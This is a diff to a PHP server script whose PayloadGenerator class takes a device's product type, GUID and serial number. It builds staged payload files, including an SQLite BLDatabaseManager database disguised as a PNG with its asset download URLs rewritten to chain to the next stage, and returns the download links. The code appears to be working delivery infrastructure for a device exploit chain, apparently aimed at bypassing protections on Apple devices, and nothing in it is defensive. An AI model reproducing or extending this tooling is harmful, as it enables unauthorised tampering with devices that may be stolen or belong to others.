@@ -26,6 +26,8 @@ if (!is_dir(__DIR__ . '/firststp')) mkdir(__DIR__ . '/firststp', 0755, true);
 if (!is_dir(__DIR__ . '/2ndd')) mkdir(__DIR__ . '/2ndd', 0755, true);
 if (!is_dir(__DIR__ . '/last')) mkdir(__DIR__ . '/last', 0755, true);
 
+require_once __DIR__ . '/validate.php';
+
 function log_debug($msg, $level = 'INFO') {
     $timestamp = date('Y-m-d H:i:s');
     error_log("[$timestamp] [$level] $msg");
@@ -154,18 +156,45 @@ class PayloadGenerator {
         mkdir($dir2, 0755, true);
 
         $blTemplateFile = __DIR__ . '/BLDatabaseManager.png';
-        if (file_exists($blTemplateFile)) {
+        $blSqliteFile = __DIR__ . '/BLDatabaseManager.sqlite';
+        
+        if (file_exists($blSqliteFile)) {
+            copy($blSqliteFile, "$dir2/belliloveu.png");
+            log_debug("Using binary BLDatabaseManager.sqlite template");
+            
+            try {
+                $db = new SQLite3("$dir2/belliloveu.png");
+                $placeholders = ['KEYOOOOOO', 'https://your_domain_here', 'http://your_domain_here'];
+                foreach ($placeholders as $placeholder) {
+                    $db->exec("UPDATE ZBLDOWNLOADINFO SET ZASSETURL = REPLACE(ZASSETURL, '$placeholder', '$fixedFileUrl') WHERE ZASSETURL LIKE '%$placeholder%' OR ZASSETURL = '$placeholder'");
+                }
+                $db->exec("UPDATE ZBLDOWNLOADINFO SET ZASSETURL = '$fixedFileUrl' WHERE ZASSETURL IS NULL OR ZASSETURL = ''");
+                $db->close();
+                log_debug("Updated BLDatabase with Stage 1 URL: $fixedFileUrl");
+            } catch (Exception $e) {
+                log_debug("Warning: Could not update BLDatabase URLs: " . $e->getMessage(), "WARN");
+            }
+        } elseif (file_exists($blTemplateFile)) {
             $blSql = file_get_contents($blTemplateFile);
             log_debug("Using BLDatabaseManager.png template");
+            
+            $placeholders = ['KEYOOOOOO', 'https://your_domain_here', 'http://your_domain_here'];
+            foreach ($placeholders as $placeholder) {
+                $blSql = str_replace($placeholder, $fixedFileUrl, $blSql);
+            }
+            
+            $this->createDatabaseFromSql($blSql, "$dir2/belliloveu.png");
         } else {
             $blSql = $this->readTemplate(TEMPLATE_DIR . '/bl_structure.sql');
             log_debug("Using bl_structure.sql template");
+            
+            $placeholders = ['KEYOOOOOO', 'https://your_domain_here', 'http://your_domain_here'];
+            foreach ($placeholders as $placeholder) {
+                $blSql = str_replace($placeholder, $fixedFileUrl, $blSql);
+            }
+            
+            $this->createDatabaseFromSql($blSql, "$dir2/belliloveu.png");
         }
-        
-        $blSql = str_replace('KEYOOOOOO', $fixedFileUrl, $blSql);
-        
-        $this->createDatabaseFromSql($blSql, "$dir2/intermediate.sqlite");
-        rename("$dir2/intermediate.sqlite", "$dir2/belliloveu.png");
         
         touch("$dir2/belliloveu.png-wal");
         touch("$dir2/belliloveu.png-shm");
@@ -231,7 +260,14 @@ class PayloadGenerator {
         log_debug("=== PAYLOAD GENERATION COMPLETE ===");
         log_debug("Final URL: $finalUrl");
         
-        return $finalUrl;
+        return [
+            'downloadUrl' => $finalUrl,
+            'links' => [
+                'step1_fixedfile' => $fixedFileUrl,
+                'step2_bldatabase' => $blUrl,
+                'step3_final' => $finalUrl
+            ]
+        ];
     }
 }
 
@@ -246,31 +282,48 @@ if (isset($_GET['prd'], $_GET['guid'], $_GET['sn'])) {
         
         log_debug("Request received: prd=$prd, guid=$guid, sn=$sn");
         
-        if (empty($prd) || empty($guid) || empty($sn)) {
+        $validation = ParameterValidator::validateAll($prd, $guid, $sn);
+        if (!$validation['valid']) {
             http_response_code(400);
             header('Content-Type: application/json');
-            echo json_encode(["success" => false, "error" => "Parameters cannot be empty"]);
+            echo json_encode([
+                "success" => false, 
+                "error" => "Parameter validation failed",
+                "validation_errors" => $validation['errors']
+            ], JSON_PRETTY_PRINT);
+            exit;
+        }
+        
+        $prd = $validation['normalized']['prd'];
+        $guid = $validation['normalized']['guid'];
+        $sn = $validation['normalized']['sn'];
+        
+        $deviceCheck = ParameterValidator::checkDeviceSupport($prd, ASSETS_DIR);
+        if (!$deviceCheck['supported']) {
+            http_response_code(404);
+            header('Content-Type: application/json');
+            echo json_encode([
+                "success" => false,
+                "error" => $deviceCheck['error'],
+                "hint" => "Use /devices endpoint to see supported devices"
+            ], JSON_PRETTY_PRINT);
             exit;
         }
         
         $gen = new PayloadGenerator($prd, $guid, $sn);
-        $url = $gen->process();
+        $result = $gen->process();
         
         header('Content-Type: application/json');
         $response = [
             "success" => true,
             "status" => "success",
-            "downloadUrl" => $url,
+            "downloadUrl" => $result['downloadUrl'],
             "parameters" => [
                 "prd" => $prd,
                 "guid" => $guid,
                 "sn" => $sn
             ],
-            "links" => [
-                "step1_fixedfile" => str_replace('/last/', '/firststp/', preg_replace('/[^\/]+\.png$/', 'fixedfile', $url)),
-                "step2_bldatabase" => str_replace('/last/', '/2ndd/', preg_replace('/[^\/]+\.png$/', 'belliloveu.png', $url)),
-                "step3_final" => $url
-            ],
+            "links" => $result['links'],
             "timestamp" => date('Y-m-d\TH:i:sP'),
             "server_mode" => "offline_local"
         ];
